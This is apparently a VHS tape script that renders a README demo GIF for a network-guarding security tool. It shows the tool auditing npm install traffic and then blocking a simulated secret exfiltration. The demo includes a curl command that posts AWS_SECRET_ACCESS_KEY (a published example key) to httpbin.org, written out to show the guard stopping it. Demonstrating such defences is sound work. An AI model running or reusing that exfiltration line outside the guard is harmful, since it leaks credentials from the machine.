# Terminal demo for the README. Render from the repo root (needs network):
#   cargo build --release && vhs docs/demo.tape
# Output: docs/demo.gif

Output docs/demo.gif

Set Shell "bash"
Set FontSize 14
Set Width 1280
Set Height 560
Set Padding 24
Set Theme "Catppuccin Mocha"
Set TypingSpeed 35ms

# Off-camera setup: local binary on PATH, empty npm cache (so real traffic shows),
# a throwaway HOME with a local CA (so no personal paths show up), a throwaway
# project, and a fake AWS key in the environment.
Hide
Type `export PATH="$PWD/target/release:$PATH" npm_config_cache="$(mktemp -d)" HOME="$(mktemp -d)" PS1='$ '`
Enter
Type `(cd "$(mktemp -d)" && capyshield init >/dev/null 2>&1)`
Enter
Type `cd "$(mktemp -d)" && echo '{"dependencies":{"left-pad":"1.3.0"}}' > package.json`
Enter
Type `export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY && clear`
Enter
Show

# 1. Zero-config audit: what does `npm install` talk to?
Type "# What does npm install talk to?"
Sleep 600ms
Enter
Type "capyshield watch -- npm install --no-audit --no-fund"
Sleep 400ms
Enter
Sleep 4.5s

Enter

# 2. Enforce: an injected command tries to exfiltrate a secret over HTTPS.
Type "# A compromised script tries to exfiltrate AWS_SECRET_ACCESS_KEY"
Sleep 600ms
Enter
Type `capyshield guard --tls mitm -- curl -s -d "k=$AWS_SECRET_ACCESS_KEY" https://httpbin.org/post`
Sleep 400ms
Enter
Sleep 4s
Type `echo "exit code: $?"`
Enter
Sleep 3s
